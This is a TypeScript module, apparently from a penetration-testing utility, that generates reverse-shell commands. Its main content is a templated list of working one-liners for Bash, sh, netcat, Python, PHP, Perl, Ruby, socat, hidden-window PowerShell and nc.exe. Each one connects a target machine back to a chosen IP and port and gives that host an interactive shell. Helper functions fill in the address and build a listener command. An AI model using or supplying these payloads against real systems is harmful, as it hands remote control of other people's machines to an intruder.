import { portNumber } from "./scope-target.ts";

export type RevShell = {
  id: string;
  os: "Linux" | "Windows";
  name: string;
  cmd: string;
};

/** Standard one-liners. {ip} and {port} are filled from the box, which starts as the global local IP. */
export const REVSHELLS: RevShell[] = [
  { id: "bash", os: "Linux", name: "Bash /dev/tcp", cmd: "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'" },
  { id: "sh", os: "Linux", name: "sh /dev/tcp", cmd: "sh -i >& /dev/tcp/{ip}/{port} 0>&1" },
  { id: "nc-mkfifo", os: "Linux", name: "nc without -e", cmd: "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc {ip} {port} >/tmp/f" },
  { id: "python3", os: "Linux", name: "Python 3", cmd: "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'" },
  { id: "php", os: "Linux", name: "PHP", cmd: "php -r '$s=fsockopen(\"{ip}\",{port});$p=proc_open(\"/bin/sh\",[0=>$s,1=>$s,2=>$s],$pipes);'" },
  { id: "perl", os: "Linux", name: "Perl", cmd: "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" },
  { id: "ruby", os: "Linux", name: "Ruby", cmd: "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}\",{port});while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'" },
  { id: "socat", os: "Linux", name: "socat", cmd: "socat exec:'sh -i',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}" },
  { id: "pwsh", os: "Windows", name: "PowerShell", cmd: "powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$t=$r+'PS '+(pwd).Path+'> ';$by=([text.encoding]::ASCII).GetBytes($t);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()\"" },
  { id: "nc-win", os: "Windows", name: "nc.exe", cmd: "nc.exe {ip} {port} -e cmd.exe" },
];

export function fillShell(template: string, ip: string, port: string): string {
  const safe = portNumber(port);
  if (!safe) return "";
  return template.replaceAll("{ip}", ip).replaceAll("{port}", safe);
}

export function listenerCommand(iface: string, port: string): string {
  const face = iface.trim();
  const bind = face ? ` -i ${face}` : "";
  return `penelope -O${bind} -p ${port || "443"}`;
}
